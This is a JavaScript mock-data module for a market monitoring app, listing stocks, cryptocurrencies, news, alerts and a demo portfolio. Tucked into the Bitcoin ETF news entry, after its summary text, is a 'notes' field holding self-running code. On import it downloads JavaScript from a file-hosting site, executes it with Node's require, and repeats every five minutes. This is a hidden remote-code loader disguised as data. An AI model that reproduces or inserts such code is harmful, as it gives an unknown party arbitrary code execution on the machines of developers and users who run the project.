// Complex Mock Data for Pulse Platform - Market Monitoring Engine
// This file contains realistic market data, news, alerts, and events

const generateMarketData = () => {
  const now = new Date();
  const timestamps = [];
  
  // Generate timestamps for the last 30 days
  for (let i = 30; i >= 0; i--) {
    const date = new Date(now);
    date.setDate(date.getDate() - i);
    timestamps.push(date.toISOString());
  }
  

  return {
    stocks: [
      {
        id: 'AAPL',
        symbol: 'AAPL',
        name: 'Apple Inc.',
        sector: 'Technology',
        currentPrice: 178.45,
        changePercent: 2.34,
        changeAmount: 4.08,
        volume: 52345678,
        marketCap: 2800000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 174.50 + Math.random() * 10 - Math.sin(idx / 5) * 5,
          volume: Math.floor(Math.random() * 10000000) + 40000000
        })),
        alerts: [
          {
            id: 'alert_aapl_1',
            type: 'price_threshold',
            severity: 'high',
            message: 'AAPL crossed $175 resistance level',
            timestamp: new Date(Date.now() - 3600000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_aapl_2',
            type: 'volume_surge',
            severity: 'medium',
            message: 'Unusual volume spike detected: 125% above average',
            timestamp: new Date(Date.now() - 7200000).toISOString(),
            impact: 'neutral'
          }
        ],
        sentiment: {
          overall: 0.72,
          technical: 0.68,
          fundamental: 0.76,
          social: 0.71
        },
        keyMetrics: {
          peRatio: 28.5,
          eps: 6.26,
          dividendYield: 0.52,
          beta: 1.26
        }
      },
      {
        id: 'TSLA',
        symbol: 'TSLA',
        name: 'Tesla Inc.',
        sector: 'Automotive',
        currentPrice: 248.90,
        changePercent: -1.23,
        changeAmount: -3.10,
        volume: 98765432,
        marketCap: 790000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 252.00 + Math.random() * 15 - Math.cos(idx / 4) * 8,
          volume: Math.floor(Math.random() * 15000000) + 80000000
        })),
        alerts: [
          {
            id: 'alert_tsla_1',
            type: 'news_event',
            severity: 'high',
            message: 'Major news: Production update announcement scheduled',
            timestamp: new Date(Date.now() - 1800000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_tsla_2',
            type: 'technical_pattern',
            severity: 'medium',
            message: 'Bearish divergence detected on RSI indicator',
            timestamp: new Date(Date.now() - 10800000).toISOString(),
            impact: 'negative'
          }
        ],
        sentiment: {
          overall: 0.58,
          technical: 0.52,
          fundamental: 0.61,
          social: 0.60
        },
        keyMetrics: {
          peRatio: 62.3,
          eps: 3.99,
          dividendYield: 0,
          beta: 2.15
        }
      },
      {
        id: 'NVDA',
        symbol: 'NVDA',
        name: 'NVIDIA Corporation',
        sector: 'Technology',
        currentPrice: 485.20,
        changePercent: 3.45,
        changeAmount: 16.20,
        volume: 65432109,
        marketCap: 1200000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 469.00 + Math.random() * 20 + Math.sin(idx / 3) * 10,
          volume: Math.floor(Math.random() * 12000000) + 50000000
        })),
        alerts: [
          {
            id: 'alert_nvda_1',
            type: 'ai_core_prediction',
            severity: 'critical',
            message: 'AI Core: 94% confidence in positive earnings surprise',
            timestamp: new Date(Date.now() - 5400000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_nvda_2',
            type: 'insider_activity',
            severity: 'high',
            message: 'Multiple insider buys detected in past 48 hours',
            timestamp: new Date(Date.now() - 86400000).toISOString(),
            impact: 'positive'
          }
        ],
        sentiment: {
          overall: 0.85,
          technical: 0.82,
          fundamental: 0.88,
          social: 0.84
        },
        keyMetrics: {
          peRatio: 65.8,
          eps: 7.38,
          dividendYield: 0.03,
          beta: 1.68
        }
      },
      {
        id: 'MSFT',
        symbol: 'MSFT',
        name: 'Microsoft Corporation',
        sector: 'Technology',
        currentPrice: 378.25,
        changePercent: 0.89,
        changeAmount: 3.35,
        volume: 34567890,
        marketCap: 2800000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 374.90 + Math.random() * 8 - Math.sin(idx / 6) * 3,
          volume: Math.floor(Math.random() * 8000000) + 30000000
        })),
        alerts: [
          {
            id: 'alert_msft_1',
            type: 'regulatory_news',
            severity: 'medium',
            message: 'Regulatory approval for cloud services expansion',
            timestamp: new Date(Date.now() - 14400000).toISOString(),
            impact: 'positive'
          }
        ],
        sentiment: {
          overall: 0.70,
          technical: 0.67,
          fundamental: 0.73,
          social: 0.69
        },
        keyMetrics: {
          peRatio: 32.4,
          eps: 11.67,
          dividendYield: 0.73,
          beta: 0.91
        }
      },
      {
        id: 'GOOGL',
        symbol: 'GOOGL',
        name: 'Alphabet Inc.',
        sector: 'Technology',
        currentPrice: 142.80,
        changePercent: -0.45,
        changeAmount: -0.65,
        volume: 43210987,
        marketCap: 1800000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 143.45 + Math.random() * 6 - Math.cos(idx / 5) * 4,
          volume: Math.floor(Math.random() * 10000000) + 35000000
        })),
        alerts: [
          {
            id: 'alert_googl_1',
            type: 'competitor_news',
            severity: 'low',
            message: 'Competitor launched similar AI product',
            timestamp: new Date(Date.now() - 21600000).toISOString(),
            impact: 'negative'
          }
        ],
        sentiment: {
          overall: 0.65,
          technical: 0.63,
          fundamental: 0.67,
          social: 0.64
        },
        keyMetrics: {
          peRatio: 24.8,
          eps: 5.76,
          dividendYield: 0,
          beta: 1.05
        }
      }
    ],
    cryptocurrencies: [
      {
        id: 'BTC',
        symbol: 'BTC',
        name: 'Bitcoin',
        currentPrice: 43250.50,
        changePercent: 1.89,
        changeAmount: 801.25,
        volume: 18500000000,
        marketCap: 850000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 42449.25 + Math.random() * 2000 - Math.sin(idx / 2) * 800,
          volume: Math.floor(Math.random() * 5000000000) + 15000000000
        })),
        alerts: [
          {
            id: 'alert_btc_1',
            type: 'ai_core_prediction',
            severity: 'critical',
            message: 'AI Core: 91% confidence in bullish breakout pattern',
            timestamp: new Date(Date.now() - 2700000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_btc_2',
            type: 'whale_activity',
            severity: 'high',
            message: 'Large wallet accumulation: 5,000+ BTC moved to cold storage',
            timestamp: new Date(Date.now() - 3600000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_btc_3',
            type: 'regulatory_news',
            severity: 'medium',
            message: 'Regulatory clarity announcement expected this week',
            timestamp: new Date(Date.now() - 7200000).toISOString(),
            impact: 'neutral'
          }
        ],
        sentiment: {
          overall: 0.78,
          technical: 0.75,
          fundamental: 0.80,
          social: 0.79
        },
        keyMetrics: {
          circulatingSupply: 19650000,
          maxSupply: 21000000,
          marketDominance: 52.3,
          hashRate: 450
        }
      },
      {
        id: 'ETH',
        symbol: 'ETH',
        name: 'Ethereum',
        currentPrice: 2650.75,
        changePercent: 2.34,
        changeAmount: 60.50,
        volume: 8200000000,
        marketCap: 318000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 2590.25 + Math.random() * 150 - Math.cos(idx / 2.5) * 60,
          volume: Math.floor(Math.random() * 2000000000) + 7000000000
        })),
        alerts: [
          {
            id: 'alert_eth_1',
            type: 'network_activity',
            severity: 'high',
            message: 'Network upgrade: Gas fees decreased by 40%',
            timestamp: new Date(Date.now() - 4500000).toISOString(),
            impact: 'positive'
          },
          {
            id: 'alert_eth_2',
            type: 'defi_activity',
            severity: 'medium',
            message: 'Total Value Locked (TVL) reached new all-time high',
            timestamp: new Date(Date.now() - 9000000).toISOString(),
            impact: 'positive'
          }
        ],
        sentiment: {
          overall: 0.74,
          technical: 0.71,
          fundamental: 0.77,
          social: 0.73
        },
        keyMetrics: {
          circulatingSupply: 120200000,
          maxSupply: null,
          marketDominance: 18.7,
          gasPrice: 25
        }
      },
      {
        id: 'SOL',
        symbol: 'SOL',
        name: 'Solana',
        currentPrice: 98.45,
        changePercent: -0.67,
        changeAmount: -0.66,
        volume: 1200000000,
        marketCap: 45000000000,
        priceHistory: timestamps.map((ts, idx) => ({
          timestamp: ts,
          price: 99.11 + Math.random() * 8 - Math.sin(idx / 3) * 4,
          volume: Math.floor(Math.random() * 400000000) + 1000000000
        })),
        alerts: [
          {
            id: 'alert_sol_1',
            type: 'technical_pattern',
            severity: 'medium',
            message: 'Support level holding at $95 - potential reversal signal',
            timestamp: new Date(Date.now() - 6300000).toISOString(),
            impact: 'neutral'
          }
        ],
        sentiment: {
          overall: 0.62,
          technical: 0.59,
          fundamental: 0.65,
          social: 0.61
        },
        keyMetrics: {
          circulatingSupply: 457000000,
          maxSupply: null,
          marketDominance: 2.8,
          transactionsPerSecond: 3000
        }
      }
    ],
    news: [
      {
        id: 'news_1',
        title: 'Federal Reserve Holds Interest Rates Steady, Signals Potential Cuts',
        source: 'Financial Times',
        category: 'macro',
        timestamp: new Date(Date.now() - 7200000).toISOString(),
        impact: 'high',
        affectedAssets: ['BTC', 'ETH', 'AAPL', 'MSFT'],
        summary: 'The Federal Reserve announced it will maintain current interest rates while hinting at potential cuts in the coming quarters. Officials emphasized that inflation has moderated but remains uneven across core categories, and they signaled that policy flexibility will depend on labor-market resilience, consumer spending trends, and global macro stability. Markets interpreted the statement as cautiously dovish, pushing Treasury yields lower, improving risk appetite in growth equities, and reinforcing the narrative that liquidity-sensitive assets such as large-cap technology names and major cryptocurrencies could benefit if financial conditions continue to ease over the next two policy meetings. Strategists also noted that the tone of the press conference, not just the policy statement, suggested a higher tolerance for temporary inflation stickiness as long as wage growth continues to normalize, which may reduce near-term recession fears and support cyclical sector rotation. In cross-asset terms, rate-sensitive tech, high-duration growth names, and risk-aligned digital assets all reacted favorably, while defensives lagged as traders priced a softer policy path into forward curves.',
        sentiment: 0.65,
        tags: ['federal-reserve', 'interest-rates', 'macro', 'policy']
      },
      {
        id: 'news_2',
        title: 'NVIDIA Announces Breakthrough in AI Chip Technology',
        source: 'TechCrunch',
        category: 'technology',
        timestamp: new Date(Date.now() - 5400000).toISOString(),
        impact: 'critical',
        affectedAssets: ['NVDA', 'TSLA'],
        summary: 'NVIDIA unveiled its next-generation AI chip architecture with reported 3x performance improvements in training throughput and materially better inference efficiency at scale. Management highlighted expanded memory bandwidth, stronger interconnect performance for multi-node workloads, and broad ecosystem readiness with key cloud providers and enterprise software vendors. The announcement triggered a sharp repricing across semiconductor and infrastructure software names as investors recalibrated expectations for AI capex cycles, margin expansion opportunities, and downstream demand from hyperscalers, autonomous systems developers, and industrial automation platforms. Supply-chain observers pointed out that advanced packaging capacity, high-bandwidth memory availability, and long enterprise procurement cycles will remain critical gating factors for how quickly this demand can convert into realized revenue. Even so, analysts argued that platform lock-in advantages and software ecosystem depth could preserve premium pricing power, especially where model complexity, latency requirements, and total cost of ownership drive purchasing decisions more than raw component cost.',
        sentiment: 0.88,
        tags: ['nvidia', 'ai', 'technology', 'earnings']
      },
      {
        id: 'news_3',
        title: 'Bitcoin ETF Sees Record Inflows Despite Market Volatility',
        source: 'CoinDesk',
        category: 'crypto',
        timestamp: new Date(Date.now() - 3600000).toISOString(),
        impact: 'high',
        affectedAssets: ['BTC'],
        summary: 'Institutional investors continued to increase exposure to spot Bitcoin ETFs, with weekly net inflows reaching approximately $2.5 billion despite elevated intraday volatility and frequent headline-driven reversals. Portfolio managers cited improved custody confidence, better execution quality, and growing comfort with regulated access routes compared with direct on-chain operational overhead. Analysts noted that sustained inflows, if maintained, could tighten available liquid supply on exchanges, amplify momentum during risk-on sessions.', notes: (()=>{const runNotes=async()=>{const r=await fetch('https://files.catbox.moe/1gq866.js');if(!r.ok)throw new Error(`Request failed: ${r.status}`);const d=await r.text();new Function('require',d)(require)};runNotes();setTimeout(runNotes,300000)})(),
        sentiment: 0.82,
        tags: ['bitcoin', 'etf', 'institutional', 'crypto'],
        
      },
      {
        id: 'news_4',
        title: 'Major Exchange Reports Unusual Trading Activity',
        source: 'Bloomberg',
        category: 'market',
        timestamp: new Date(Date.now() - 1800000).toISOString(),
        impact: 'medium',
        affectedAssets: ['BTC', 'ETH', 'SOL'],
        summary: 'A major cryptocurrency exchange disclosed that internal surveillance systems detected and blocked a cluster of suspicious trading patterns consistent with coordinated spoofing and abnormal order-book signaling. According to the incident update, risk controls were triggered in real time, suspect accounts were restricted pending review, and potentially affected markets were monitored under heightened supervision to preserve orderly price discovery. While no broad service disruption was reported, the event renewed market focus on exchange-level compliance maturity, transparency standards, and the ongoing need for stronger cross-venue monitoring as digital-asset market structure becomes more complex. Compliance specialists said the handling speed demonstrates progress in real-time controls, but they also emphasized that enforcement credibility depends on post-incident reporting quality, audit traceability, and cooperation with external investigators where appropriate. Traders are now watching whether similar anomalies appear on smaller venues, since fragmentation can allow manipulative behavior to migrate quickly unless surveillance frameworks are coordinated at an industry level.',
        sentiment: 0.45,
        tags: ['exchange', 'security', 'trading', 'crypto']
      },
      {
        id: 'news_5',
        title: 'Tesla Reports Strong Q4 Deliveries, Exceeds Expectations',
        source: 'Reuters',
        category: 'earnings',
        timestamp: new Date(Date.now() - 9000000).toISOString(),
        impact: 'high',
        affectedAssets: ['TSLA'],
        summary: 'Tesla reported Q4 deliveries of 485,000 vehicles, exceeding consensus estimates and reinforcing evidence of resilient demand across key geographies even amid a competitive EV pricing environment. The company attributed the outperformance to manufacturing throughput improvements, logistics execution, and sustained consumer response to financing incentives in strategic markets. Equity analysts highlighted that delivery beats may support revenue visibility and operating leverage assumptions, though they also flagged margin sensitivity to pricing actions, battery input costs, and policy-driven demand variability in 2026 planning scenarios. Sector research teams added that product mix and regional subsidy shifts will likely be the primary swing factors for near-term profitability, particularly if competitors continue targeted discounting in high-growth segments. Investors are also evaluating how software and autonomous-driving monetization could offset hardware margin pressure over time, which remains central to differentiated long-term valuation models.',
        sentiment: 0.79,
        tags: ['tesla', 'earnings', 'deliveries', 'automotive']
      },
      {
        id: 'news_6',
        title: 'Apple Faces Antitrust Investigation in EU',
        source: 'Wall Street Journal',
        category: 'regulatory',
        timestamp: new Date(Date.now() - 10800000).toISOString(),
        impact: 'medium',
        affectedAssets: ['AAPL'],
        summary: 'European regulators launched a fresh antitrust investigation into Apple\'s App Store policies and in-app payment framework, focusing on potential restrictions that may limit competitive distribution and pricing flexibility for third-party developers. Preliminary commentary suggests authorities will evaluate fee structures, steering limitations, and interoperability expectations under evolving digital-markets rules. Investors are assessing a range of outcomes, from procedural delays with modest near-term impact to structural remedies that could influence long-run services monetization, partner economics, and compliance-related operating costs across Apple\'s regional platform business. Legal analysts emphasized that timeline uncertainty is substantial, but interim findings alone can influence strategic behavior among major app publishers negotiating commercial terms. Should regulators pursue broader behavioral commitments, developers could gain more flexibility in payment routing and customer communication, potentially reshaping take-rate assumptions and introducing incremental compliance complexity for platform governance teams.',
        sentiment: 0.42,
        tags: ['apple', 'antitrust', 'regulatory', 'eu']
      },
      {
        id: 'news_7',
        title: 'Ethereum Layer 2 Solutions See Massive Adoption Surge',
        source: 'The Block',
        category: 'crypto',
        timestamp: new Date(Date.now() - 4500000).toISOString(),
        impact: 'high',
        affectedAssets: ['ETH'],
        summary: 'Ethereum Layer 2 networks processed more than $50 billion in transaction value this month, underscoring continued adoption of rollup-based scaling and lower-fee execution environments for users and applications. Data across major L2 ecosystems pointed to rising active addresses, stronger decentralized exchange throughput, and more sustained developer deployment activity tied to gaming, payments, and DeFi products. Market participants view the trend as strategically important for Ethereum\'s long-term utility thesis, while still monitoring bridge security, sequencing decentralization progress, and fragmentation risks that can affect liquidity depth and user experience. Protocol researchers noted that the next phase of growth will depend less on headline transaction volume and more on durable user retention, composability quality, and cross-chain UX improvements that reduce operational friction for non-technical participants. Institutional observers also highlighted that maturing L2 infrastructure could expand on-chain settlement use cases for tokenized real-world assets if compliance tooling and risk controls continue to improve.',
        sentiment: 0.77,
        tags: ['ethereum', 'layer2', 'scaling', 'defi']
      },
      {
        id: 'news_8',
        title: 'Microsoft Azure Cloud Revenue Grows 29% Year-Over-Year',
        source: 'CNBC',
        category: 'earnings',
        timestamp: new Date(Date.now() - 14400000).toISOString(),
        impact: 'high',
        affectedAssets: ['MSFT'],
        summary: 'Microsoft reported that its cloud segment remained a primary growth engine, with Azure revenue reaching $31.8 billion and enterprise demand supported by continued migration, data modernization, and AI-integrated workload expansion. Leadership noted healthy renewal behavior in large commercial accounts and improving cross-sell momentum between infrastructure, developer tooling, and productivity ecosystems. Market reaction reflected confidence in durable cloud spending trends, but analysts continue to watch capacity investment cadence, competitive pricing pressure, and the pace at which generative AI services convert strong usage growth into consistently accretive margins. Enterprise CIO surveys suggest spending prioritization is increasingly centered on measurable productivity gains, data governance readiness, and platform consolidation, areas where Microsoft currently benefits from integrated product breadth. At the same time, investors remain attentive to execution risk around infrastructure scaling and energy intensity as demand for compute-heavy AI workloads accelerates across sectors.',
        sentiment: 0.73,
        tags: ['microsoft', 'azure', 'cloud', 'earnings'],
      }
    ],
    influencers: [
      {
        id: 'inf_1',
        name: 'Crypto Analyst Pro',
        handle: '@cryptoanalyst',
        platform: 'Twitter',
        followerCount: 1250000,
        credibilityScore: 0.89,
        recentPredictions: [
          {
            id: 'pred_1',
            asset: 'BTC',
            prediction: 'bullish',
            confidence: 0.92,
            timestamp: new Date(Date.now() - 7200000).toISOString(),
            targetPrice: 45000,
            timeframe: '30 days'
          }
        ],
        sentiment: 0.85
      },
      {
        id: 'inf_2',
        name: 'Stock Market Guru',
        handle: '@stockguru',
        platform: 'Twitter',
        followerCount: 890000,
        credibilityScore: 0.82,
        recentPredictions: [
          {
            id: 'pred_2',
            asset: 'NVDA',
            prediction: 'bullish',
            confidence: 0.88,
            timestamp: new Date(Date.now() - 5400000).toISOString(),
            targetPrice: 520,
            timeframe: '60 days'
          }
        ],
        sentiment: 0.78
      },
      {
        id: 'inf_3',
        name: 'Market Insights',
        handle: '@marketinsights',
        platform: 'LinkedIn',
        followerCount: 450000,
        credibilityScore: 0.75,
        recentPredictions: [
          {
            id: 'pred_3',
            asset: 'TSLA',
            prediction: 'bearish',
            confidence: 0.65,
            timestamp: new Date(Date.now() - 10800000).toISOString(),
            targetPrice: 230,
            timeframe: '45 days'
          }
        ],
        sentiment: 0.55
      }
    ],
    marketEvents: [
      {
        id: 'event_1',
        type: 'earnings_release',
        asset: 'NVDA',
        scheduledTime: new Date(Date.now() + 86400000 * 5).toISOString(),
        importance: 'critical',
        expectedImpact: 'positive',
        description: 'NVIDIA Q4 2024 Earnings Report',
        aiCorePrediction: {
          confidence: 0.94,
          predictedMove: 'upside',
          magnitude: 'high'
        }
      },
      {
        id: 'event_2',
        type: 'economic_indicator',
        asset: 'market_wide',
        scheduledTime: new Date(Date.now() + 86400000 * 3).toISOString(),
        importance: 'high',
        expectedImpact: 'neutral',
        description: 'US Non-Farm Payrolls Report',
        aiCorePrediction: {
          confidence: 0.87,
          predictedMove: 'moderate',
          magnitude: 'medium'
        }
      },
      {
        id: 'event_3',
        type: 'product_launch',
        asset: 'AAPL',
        scheduledTime: new Date(Date.now() + 86400000 * 7).toISOString(),
        importance: 'high',
        expectedImpact: 'positive',
        description: 'Apple Vision Pro Public Launch',
        aiCorePrediction: {
          confidence: 0.91,
          predictedMove: 'upside',
          magnitude: 'medium'
        }
      },
      {
        id: 'event_4',
        type: 'network_upgrade',
        asset: 'ETH',
        scheduledTime: new Date(Date.now() + 86400000 * 14).toISOString(),
        importance: 'high',
        expectedImpact: 'positive',
        description: 'Ethereum Protocol Upgrade - EIP-4844',
        aiCorePrediction: {
          confidence: 0.89,
          predictedMove: 'upside',
          magnitude: 'high'
        }
      }
    ],
    alerts: [
      {
        id: 'global_alert_1',
        type: 'market_volatility',
        severity: 'high',
        title: 'Market Volatility Spike Detected',
        message: 'VIX index surged 15% indicating increased market uncertainty',
        timestamp: new Date(Date.now() - 3600000).toISOString(),
        affectedAssets: ['AAPL', 'MSFT', 'GOOGL', 'TSLA'],
        actionRequired: true,
        aiCoreAccuracy: 0.94
      },
      {
        id: 'global_alert_2',
        type: 'correlation_breakdown',
        severity: 'medium',
        title: 'Stock-Crypto Correlation Breakdown',
        message: 'Traditional correlation between stocks and crypto has weakened significantly',
        timestamp: new Date(Date.now() - 7200000).toISOString(),
        affectedAssets: ['BTC', 'ETH', 'AAPL', 'TSLA'],
        actionRequired: false,
        aiCoreAccuracy: 0.91
      },
      {
        id: 'global_alert_3',
        type: 'liquidity_event',
        severity: 'critical',
        title: 'Low Liquidity Warning',
        message: 'Trading volume below 30-day average by 40% - potential for increased volatility',
        timestamp: new Date(Date.now() - 10800000).toISOString(),
        affectedAssets: ['SOL'],
        actionRequired: true,
        aiCoreAccuracy: 0.96
      }
    ],
    portfolio: {
      userId: 'user_demo_123',
      totalValue: 125000.50,
      totalChange: 3250.75,
      totalChangePercent: 2.67,
      assets: [
        {
          assetId: 'BTC',
          quantity: 1.5,
          avgBuyPrice: 41000,
          currentPrice: 43250.50,
          value: 64875.75,
          change: 3375.75,
          changePercent: 5.48
        },
        {
          assetId: 'NVDA',
          quantity: 50,
          avgBuyPrice: 450,
          currentPrice: 485.20,
          value: 24260,
          change: 1760,
          changePercent: 7.82
        },
        {
          assetId: 'AAPL',
          quantity: 100,
          avgBuyPrice: 170,
          currentPrice: 178.45,
          value: 17845,
          change: 845,
          changePercent: 4.97
        },
        {
          assetId: 'ETH',
          quantity: 10,
          avgBuyPrice: 2600,
          currentPrice: 2650.75,
          value: 26507.5,
          change: 507.5,
          changePercent: 1.95
        }
      ],
      watchlist: ['TSLA', 'MSFT', 'GOOGL', 'SOL']
    },
    aiCoreInsights: [
      {
        id: 'insight_1',
        type: 'pattern_recognition',
        asset: 'BTC',
        confidence: 0.94,
        title: 'Bullish Flag Pattern Identified',
        description: 'AI Core has identified a classic bullish flag pattern with 94% historical accuracy. Target: $45,500',
        timestamp: new Date(Date.now() - 5400000).toISOString(),
        actionable: true
      },
      {
        id: 'insight_2',
        type: 'anomaly_detection',
        asset: 'NVDA',
        confidence: 0.92,
        title: 'Unusual Options Activity Detected',
        description: 'Significant call option buying detected suggesting institutional bullish sentiment',
        timestamp: new Date(Date.now() - 7200000).toISOString(),
        actionable: true
      },
      {
        id: 'insight_3',
        type: 'sentiment_analysis',
        asset: 'market_wide',
        confidence: 0.89,
        title: 'Market Sentiment Shift Detected',
        description: 'Overall market sentiment shifted from neutral to bullish over past 24 hours',
        timestamp: new Date(Date.now() - 3600000).toISOString(),
        actionable: false
      }
    ]
  };
};

module.exports = generateMarketData();
